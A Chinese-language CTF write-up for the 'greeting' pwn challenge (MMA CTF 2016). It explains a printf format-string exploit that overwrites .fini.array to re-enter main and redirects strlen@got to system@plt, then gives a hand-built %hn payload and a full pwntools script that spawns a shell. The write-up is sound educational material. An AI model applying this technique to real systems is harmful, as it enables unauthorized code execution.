[toc]

## MMA CTF 2nd 2016-greeting

### 总结

本题主要为`printf`格式化字符串漏洞，最好的方式是手写`fmt payload`，然后有一个新的知识点：

- pwntools的`fmtstr_payload`不是特别好用，特别是只想写低字节的时候，还是得手动写`fmt_payload`，抽个时间自己写个格式化`payload`生成函数吧。也不是第一次在这儿折腾了。
- 一个新的知识点：程序在初始化的时候，会依次调用`init.array`中的函数指针；在`main`函数执行完退出的时候，依次调用`.fini.array`中的函数指针。这两个段基本都是可读可写的。
- 可以利用`printf`将`fini.array`数组中的第一个元素覆盖为`main`函数的地址，或者`_start`函数的地址，可以循环运行`main`函数。本题只能多循环利用1次，之后就会报错。因为`fini.array`段的只有一个指针大小。

### 题目分析

#### checksec

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228162702.png)

#### 函数分析

- main：

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228162758.png)

  `main`函数中，首先接收`stdin`的输入，最多输入`64`个字符，然后将输入的内容进行拼接，拼接后直接`printf`打印。

- getnline：

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228164153.png)

  就是普通的读取输入的函数。注意，这里调用了`fgets`，`strchr`，`strlen`函数。

#### 漏洞点

很明显，格式化字符串漏洞。不过在查看文件，发现调用过`system`函数。同时`got`可读可写，所以考虑将某个函数的`got`表写为`system@plt`。然后想办法调用`/bin/sh`。

这里有个问题，就是`printf`打印完后，直接结束程序运行。那么，基本是没有办法通过一次格式化漏洞就获取`shell`的，要想覆盖`eip`就得泄露栈地址，不可能一边泄露栈地址一边往栈地址上写。因此，需要研究一下，怎样能够让程序能再一次回到`main`函数。

### 知识点

`main`函数并不是程序运行的起点，我们至少直到，是`__libc_start_main`函数，调用的`main`函数。网上有一些资料，解析`x86`程序运行的初始化函数执行流，详情请见[这个地址](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)。这里，只拿出一张图分析：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/init.jpg)

可以看到，`_start`函数中，调用了`__libc_start_main`，然后调用`main`函数。初始化的时候，调用`init.array`数组中的函数指针，退出的时候，调用`fini.array`数组的函数指针。因此，我们只需要把`fini.array`的第一个元素覆盖为`main`或者`_start`函数的地址即可。

在`IDA`中按下`ctrl + S`，可以看到程序段：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228164036.png)

地址为`0x8049934`。

### 利用思路

步骤：

- 第一次`printf`，将`strlen@got`写为`system@plt`，同时，将`0x8049934`，也就是`fini.array`处写为`_start`地址，获得了第二次输入的机会
- 输入`/bin/sh`，会调用`strlen(s)`，实际调用`system("/bin/sh")`。

### EXP

一开始用`fmtstr_payload`生成`payload`，长度为`70`，超过了`64`。因此，手动写一下。

首先观察一下，正常情况下，`0x8049934`处的值是多少：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228164657.png)

我们要改写为`0x80484f0`，不难发现，只需要改写低两个字节即可。高两个字节保持为`0x0804`不动。

准备手动写`payload`。这里先测一下偏移，输入：`aaaa%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x`

输出为：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228165018.png)

好像`aaaa`被分开输出了，说明前面有2位的偏移，于是，修改输入为：`bbaaaa%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x`

再来一次：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228165148.png)

计算一下偏移，`offset = 12`。注意，前面有两个`a`，还有一句`Nice to meet you, `，也就是说，前面已经输出了`0x14`个字符。

直接使用`%n`写四个字节容易写失败，这里使用`$hn`两个字节依次写入。本次要往`str@got(0x8049a54)`写入为`system@plt(0x8048490)`，然后将`fini.array(0x8049934)`的低两个字节写为`0x84f0`根据要格式化字符串要写的内容，对写的字节大小排个序：

> 本次写入，要达到的目的为：
>
> 往`0x8049a56` ------> `0x0804`
>
> 往`0x8049a54` ------> `0x8490`
>
> 往`0x8049934` ------> `0x84f0`

最后结合偏移量，最终的`payload`为：

```python
payload = b'aa'
payload += b'%2032c%21$hn' + b'%31884c%22$hn' + b'%96c%23$hna' + p32(0x8049a56) + p32(0x8049a54) + p32(0x8049934)
```

然后调试一下，看看是不是都改对了：

修改前：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228170509.png)

修改后：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228170902.png)

此时，获得了第二次输入机会：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228171120.png)

输入`/bin/dash`即可得到`shell`。

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210228171225.png)



#### 完整Exp

```python
from pwn import *

io = process('./greeting')

payload = b'aa'
payload += b'%2032c%21$hn' + b'%31884c%22$hn' + b'%96c%23$hna' + p32(0x8049a56) + p32(0x8049a54) + p32(0x8049934)
io.recvuntil("Please tell me your name... ")
print(payload, len(payload))
sleep(1)
io.sendline(payload)
io.recvuntil("Please tell me your name... ")
sleep(1)
io.sendline('/bin/sh')
io.sendline('cat flag')
io.interactive()
```

